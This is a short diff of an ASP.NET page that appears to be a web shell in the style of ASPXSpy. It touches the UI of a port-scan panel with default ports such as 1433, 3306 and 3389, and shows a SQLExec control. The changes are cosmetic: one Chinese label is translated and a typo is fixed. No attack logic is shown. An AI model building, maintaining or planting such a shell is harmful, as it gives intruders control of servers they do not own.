@@ -2509,7 +2509,7 @@ Last visit time :
 <%--PortScan--%>
 <div id="YwLB" runat="server">
 <p>
-IP : <asp:TextBox id="MdR" style="width:10%;margin:0 8px;" CssClass="input" runat="server" Text="127.0.0.1"/> 端口 : <asp:TextBox id="lOmX" style="width:40%;margin:0 8px;" CssClass="input" runat="server" Text="21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500"/> <asp:Button ID="CmUCh" runat="server" Text="scanning" CssClass="bt" OnClick="ELkQ"/>
+IP : <asp:TextBox id="MdR" style="width:10%;margin:0 8px;" CssClass="input" runat="server" Text="127.0.0.1"/> port : <asp:TextBox id="lOmX" style="width:40%;margin:0 8px;" CssClass="input" runat="server" Text="21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500"/> <asp:Button ID="CmUCh" runat="server" Text="scanning" CssClass="bt" OnClick="ELkQ"/>
 </p>
 <div id="GBYT" runat="server" visible="false" enableviewstate="false"></div>
 </div>
@@ -2572,7 +2572,7 @@ SQLExec : <asp:DropDownList runat="server" ID="FGEy" AutoPostBack="True" OnSelec
 </asp:Table>
 </div>
 </td></tr></table>
-<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#e6f0ff;">Web ManAger</div></div>
+<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#e6f0ff;">Web Manager</div></div>
 </form>
 </body>
 </html>
